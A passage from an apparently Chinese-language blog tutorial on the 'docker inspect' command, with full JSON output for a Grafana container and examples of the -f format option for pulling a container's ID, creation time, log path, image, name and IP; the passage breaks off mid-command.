class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-meta"># docker inspect 4b0e2ed242e0</span><br>[<br>    &#123;<br>        <span class="hljs-string">&quot;Id&quot;</span>: <span class="hljs-string">&quot;4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1&quot;</span>,<br>        <span class="hljs-string">&quot;Created&quot;</span>: <span class="hljs-string">&quot;2022-09-16T01:30:49.271281387Z&quot;</span>,<br>        <span class="hljs-string">&quot;Path&quot;</span>: <span class="hljs-string">&quot;/run.sh&quot;</span>,<br>        <span class="hljs-string">&quot;Args&quot;</span>: [],<br>        <span class="hljs-string">&quot;State&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Status&quot;</span>: <span class="hljs-string">&quot;running&quot;</span>,<br>            <span class="hljs-string">&quot;Running&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;Paused&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Restarting&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OOMKilled&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Dead&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Pid&quot;</span>: <span class="hljs-number">1272</span>,<br>            <span class="hljs-string">&quot;ExitCode&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;Error&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;StartedAt&quot;</span>: <span class="hljs-string">&quot;2022-09-16T01:30:49.547993902Z&quot;</span>,<br>            <span class="hljs-string">&quot;FinishedAt&quot;</span>: <span class="hljs-string">&quot;0001-01-01T00:00:00Z&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:aeeaa96eea830b988643e495b3978bff65dbdb997cc938ff5a4185a6bf3d7839&quot;</span>,<br>        <span class="hljs-string">&quot;ResolvConfPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/resolv.conf&quot;</span>,<br>        <span class="hljs-string">&quot;HostnamePath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/hostname&quot;</span>,<br>        <span class="hljs-string">&quot;HostsPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/hosts&quot;</span>,<br>        <span class="hljs-string">&quot;LogPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1-json.log&quot;</span>,<br>        <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;/amazing_brahmagupta&quot;</span>,<br>        <span class="hljs-string">&quot;RestartCount&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;Driver&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span>,<br>        <span class="hljs-string">&quot;Platform&quot;</span>: <span class="hljs-string">&quot;linux&quot;</span>,<br>        <span class="hljs-string">&quot;MountLabel&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;ProcessLabel&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;AppArmorProfile&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;ExecIDs&quot;</span>: <span class="hljs-literal">null</span>,<br>        <span class="hljs-string">&quot;HostConfig&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Binds&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;ContainerIDFile&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;LogConfig&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;Type&quot;</span>: <span class="hljs-string">&quot;json-file&quot;</span>,<br>                <span class="hljs-string">&quot;Config&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;NetworkMode&quot;</span>: <span class="hljs-string">&quot;default&quot;</span>,<br>            <span class="hljs-string">&quot;PortBindings&quot;</span>: &#123;&#125;,<br>            <span class="hljs-string">&quot;RestartPolicy&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;no&quot;</span>,<br>                <span class="hljs-string">&quot;MaximumRetryCount&quot;</span>: <span class="hljs-number">0</span><br>            &#125;,<br>            <span class="hljs-string">&quot;AutoRemove&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;VolumeDriver&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;VolumesFrom&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CapAdd&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CapDrop&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CgroupnsMode&quot;</span>: <span class="hljs-string">&quot;host&quot;</span>,<br>            <span class="hljs-string">&quot;Dns&quot;</span>: [],<br>            <span class="hljs-string">&quot;DnsOptions&quot;</span>: [],<br>            <span class="hljs-string">&quot;DnsSearch&quot;</span>: [],<br>            <span class="hljs-string">&quot;ExtraHosts&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;GroupAdd&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;IpcMode&quot;</span>: <span class="hljs-string">&quot;private&quot;</span>,<br>            <span class="hljs-string">&quot;Cgroup&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Links&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;OomScoreAdj&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;PidMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Privileged&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;PublishAllPorts&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ReadonlyRootfs&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;SecurityOpt&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;UTSMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;UsernsMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;ShmSize&quot;</span>: <span class="hljs-number">67108864</span>,<br>            <span class="hljs-string">&quot;Runtime&quot;</span>: <span class="hljs-string">&quot;runc&quot;</span>,<br>            <span class="hljs-string">&quot;ConsoleSize&quot;</span>: [<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-number">0</span><br>            ],<br>            <span class="hljs-string">&quot;Isolation&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;CpuShares&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;Memory&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;NanoCpus&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CgroupParent&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;BlkioWeight&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;BlkioWeightDevice&quot;</span>: [],<br>            <span class="hljs-string">&quot;BlkioDeviceReadBps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;BlkioDeviceWriteBps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;BlkioDeviceReadIOps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;BlkioDeviceWriteIOps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CpuPeriod&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuQuota&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuRealtimePeriod&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuRealtimeRuntime&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpusetCpus&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;CpusetMems&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Devices&quot;</span>: [],<br>            <span class="hljs-string">&quot;DeviceCgroupRules&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;DeviceRequests&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;KernelMemory&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;KernelMemoryTCP&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MemoryReservation&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MemorySwap&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MemorySwappiness&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;OomKillDisable&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;PidsLimit&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Ulimits&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CpuCount&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuPercent&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;IOMaximumIOps&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;IOMaximumBandwidth&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MaskedPaths&quot;</span>: [<br>                <span class="hljs-string">&quot;/proc/asound&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/acpi&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/kcore&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/keys&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/latency_stats&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/timer_list&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/timer_stats&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/sched_debug&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/scsi&quot;</span>,<br>                <span class="hljs-string">&quot;/sys/firmware&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;ReadonlyPaths&quot;</span>: [<br>                <span class="hljs-string">&quot;/proc/bus&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/fs&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/irq&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/sys&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/sysrq-trigger&quot;</span><br>            ]<br>        &#125;,<br>        <span class="hljs-string">&quot;GraphDriver&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Data&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;LowerDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885-init/diff:/var/lib/docker/overlay2/633c4f694e05024bd76ad9fa14e1c6e91eafa6fc167d32d65323885a9716bc35/diff:/var/lib/docker/overlay2/3ecd937d9ada1a8fca42695112f838d4e6eecad76e4da399deacb18ef3649f82/diff:/var/lib/docker/overlay2/034018bf0da3afd6cf8bea09c68058ed00aef54e0874542ab6b0cd0b5a2f5b02/diff:/var/lib/docker/overlay2/6a03f6c5a8ecfae171548b33f90b727a03afd182a426885717725fbd33e1e336/diff:/var/lib/docker/overlay2/e0ab3c204ba426a01ca2074f17047430c05eecc9d07a1e950e1bc0a49bb46181/diff:/var/lib/docker/overlay2/2f13d908a74a801add00f7fff9820ccfb297beac35a2d91ea05f812e2de3faf2/diff:/var/lib/docker/overlay2/5342538fe3dcd1ce2077dc5ac82efaed68d7fa18d7d58e2c41129f1f0c3a0b3f/diff:/var/lib/docker/overlay2/40c7b37364a365de1537dd0a8fbf60f9fc1484feb520fea5a45e396dcbb4e121/diff:/var/lib/docker/overlay2/a02e590a00667b827a1e3c789b75c3bb846586593bf2fc8015546a8351f77443/diff&quot;</span>,<br>                <span class="hljs-string">&quot;MergedDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885/merged&quot;</span>,<br>                <span class="hljs-string">&quot;UpperDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885/diff&quot;</span>,<br>                <span class="hljs-string">&quot;WorkDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885/work&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Mounts&quot;</span>: [],<br>        <span class="hljs-string">&quot;Config&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;4b0e2ed242e0&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;472&quot;</span>,<br>            <span class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ExposedPorts&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;3000/tcp&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_CONFIG=/etc/grafana/grafana.ini&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_DATA=/var/lib/grafana&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_HOME=/usr/share/grafana&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_LOGS=/var/log/grafana&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_PLUGINS=/var/lib/grafana/plugins&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_PROVISIONING=/etc/grafana/provisioning&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;aeeaa96eea83&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;/usr/share/grafana&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: [<br>                <span class="hljs-string">&quot;/run.sh&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;&#125;<br>        &#125;,<br>        <span class="hljs-string">&quot;NetworkSettings&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Bridge&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;SandboxID&quot;</span>: <span class="hljs-string">&quot;d5029e992abf128054cd8dcb811ef7fcddde6c94578e84b3ad41b309eeea0301&quot;</span>,<br>            <span class="hljs-string">&quot;HairpinMode&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;LinkLocalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;LinkLocalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;Ports&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;3000/tcp&quot;</span>: <span class="hljs-literal">null</span><br>            &#125;,<br>            <span class="hljs-string">&quot;SandboxKey&quot;</span>: <span class="hljs-string">&quot;/var/run/docker/netns/d5029e992abf&quot;</span>,<br>            <span class="hljs-string">&quot;SecondaryIPAddresses&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;SecondaryIPv6Addresses&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;EndpointID&quot;</span>: <span class="hljs-string">&quot;14e461fe748eea297b8d84f043159905b7956018493b45476442b060ed2e9c3d&quot;</span>,<br>            <span class="hljs-string">&quot;Gateway&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>,<br>            <span class="hljs-string">&quot;GlobalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;GlobalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;IPAddress&quot;</span>: <span class="hljs-string">&quot;172.17.0.3&quot;</span>,<br>            <span class="hljs-string">&quot;IPPrefixLen&quot;</span>: <span class="hljs-number">16</span>,<br>            <span class="hljs-string">&quot;IPv6Gateway&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;MacAddress&quot;</span>: <span class="hljs-string">&quot;02:42:ac:11:00:03&quot;</span>,<br>            <span class="hljs-string">&quot;Networks&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;bridge&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;IPAMConfig&quot;</span>: <span class="hljs-literal">null</span>,<br>                    <span class="hljs-string">&quot;Links&quot;</span>: <span class="hljs-literal">null</span>,<br>                    <span class="hljs-string">&quot;Aliases&quot;</span>: <span class="hljs-literal">null</span>,<br>                    <span class="hljs-string">&quot;NetworkID&quot;</span>: <span class="hljs-string">&quot;3934b22c38426e6823be8668550b7d3992929a89bd449089673db6dc3dbbef26&quot;</span>,<br>                    <span class="hljs-string">&quot;EndpointID&quot;</span>: <span class="hljs-string">&quot;14e461fe748eea297b8d84f043159905b7956018493b45476442b060ed2e9c3d&quot;</span>,<br>                    <span class="hljs-string">&quot;Gateway&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>,<br>                    <span class="hljs-string">&quot;IPAddress&quot;</span>: <span class="hljs-string">&quot;172.17.0.3&quot;</span>,<br>                    <span class="hljs-string">&quot;IPPrefixLen&quot;</span>: <span class="hljs-number">16</span>,<br>                    <span class="hljs-string">&quot;IPv6Gateway&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                    <span class="hljs-string">&quot;GlobalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                    <span class="hljs-string">&quot;GlobalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>                    <span class="hljs-string">&quot;MacAddress&quot;</span>: <span class="hljs-string">&quot;02:42:ac:11:00:03&quot;</span>,<br>                    <span class="hljs-string">&quot;DriverOpts&quot;</span>: <span class="hljs-literal">null</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>]<br></code></pre></td></tr></table></figure><h4 id="OPTIONS-9"><a href="#OPTIONS-9" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f-2"><a href="#f-2" class="headerlink" title="-f"></a>-f</h5><p>指定返回值的模版文件，类似 docker inspect –format</p><h4 id="实例-10"><a href="#实例-10" class="headerlink" title="实例"></a>实例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp docker ps <br>CONTAINER ID   IMAGE                           COMMAND   CREATED         STATUS         PORTS     NAMES<br>61804e0083af   kalilinux/kali-rolling:latest   <span class="hljs-string">&quot;bash&quot;</span>    14 months ago   Up 3 seconds             kali<br></code></pre></td></tr></table></figure><h5 id="查看容器ID"><a href="#查看容器ID" class="headerlink" title="查看容器ID"></a>查看容器ID</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">docker inspect -f=&#x27;&#123;&#123;.Id&#125;&#x27; Name<span class="hljs-string">|Id</span><br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">➜  /tmp docker inspect -f=&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Id</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br><span class="language-xml">61804e0083afedef03947dc1189d5c4ecfc8f689885f8dffcac4dc4624caa00f</span><br></code></pre></td></tr></table></figure><h5 id="查看容器创建具体时间"><a href="#查看容器创建具体时间" class="headerlink" title="查看容器创建具体时间"></a>查看容器创建具体时间</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Created</span>&#125;&#125;</span><span class="language-xml">&#x27; Name|Id</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp docker ps <br>CONTAINER ID   IMAGE                           COMMAND   CREATED         STATUS         PORTS     NAMES<br>61804e0083af   kalilinux/kali-rolling:latest   <span class="hljs-string">&quot;bash&quot;</span>    14 months ago   Up 3 seconds             kali<br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">➜  /tmp docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Created</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br><span class="language-xml">2022-12-08T04:42:46.58388013Z</span><br></code></pre></td></tr></table></figure><h5 id="查看容器日志路径"><a href="#查看容器日志路径" class="headerlink" title="查看容器日志路径"></a>查看容器日志路径</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.LogPath</span>&#125;&#125;</span><span class="language-xml">&#x27; Name|Id</span><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">➜  /tmp docker <span class="hljs-keyword">inspect</span> -f <span class="hljs-string">&#x27;&#123;&#123;.LogPath&#125;&#125;&#x27;</span> <span class="hljs-number">61804</span>e0083af<br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/docker/</span>containers<span class="hljs-regexp">/61804e0083afedef03947dc1189d5c4ecfc8f689885f8dffcac4dc4624caa00f/</span><span class="hljs-number">61804</span>e0083afedef03947dc1189d5c4ecfc8f689885f8dffcac4dc4624caa00f-json.log<br></code></pre></td></tr></table></figure><h5 id="查看容器所使用镜像"><a href="#查看容器所使用镜像" class="headerlink" title="查看容器所使用镜像"></a>查看容器所使用镜像</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Image</span>&#125;&#125;</span><span class="language-xml">&#x27; Name|Id</span><br></code></pre></td></tr></table></figure><p>查询结果为镜像id，docker images 查询的id为镜像id的前12位</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">➜  ~ docker inspect -f &#x27;&#123;&#123;.Image&#125;&#125;&#x27; <span class="hljs-number">61804e0083</span>af<br>sha<span class="hljs-number">256</span>:<span class="hljs-number">0</span>d<span class="hljs-number">323592</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>f<span class="hljs-number">57780</span>d<span class="hljs-number">4</span>caa<span class="hljs-number">99</span>ba<span class="hljs-number">48e8867</span>d<span class="hljs-number">43532</span><span class="hljs-keyword">c</span><span class="hljs-number">72879</span>b<span class="hljs-number">31</span>ec<span class="hljs-number">0</span>b<span class="hljs-number">47</span>af<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>cfeb<span class="hljs-number">19</span><br>➜  ~ docker images | grep <span class="hljs-number">0</span>d<span class="hljs-number">3235</span><br>kalilinux/kali-rolling    latest       <span class="hljs-number">0</span>d<span class="hljs-number">323592</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>f<span class="hljs-number">5</span>   <span class="hljs-number">14</span> months ago   <span class="hljs-number">140</span>MB<br></code></pre></td></tr></table></figure><h5 id="查看容器名"><a href="#查看容器名" class="headerlink" title="查看容器名"></a>查看容器名</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f=&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Name</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp docker inspect -f=<span class="hljs-string">&#x27;&#123;&#123;.Name&#125;&#125;&#x27;</span> 61804e0083af<br>/kali<br>➜  /tmp docker ps | grep 61804e0083af<br>61804e0083af   kalilinux/kali-rolling:latest   <span class="hljs-string">&quot;bash&quot;</span>                   15 months ago   Up 7 minutes                                        kali<br>➜  /tmp <br><br></code></pre></td></tr></table></figure><h5 id="查看容器内IP"><a href="#查看容器内IP" class="headerlink" title="查看容器内IP"></a>查看容器内IP</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f=&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.NetworkSettings.Networks.bridge.IPAddress</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  /tmp docker inspect -f=&#x27;&#123;&#123;.NetworkSettings.Networks.bridge.IPAddress&#125;&#125;&#x27; 61804e0083af<br><span class="hljs-number">172.17.0.2</span><br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tap">➜  /tmp docker exec -it 61804e0083af 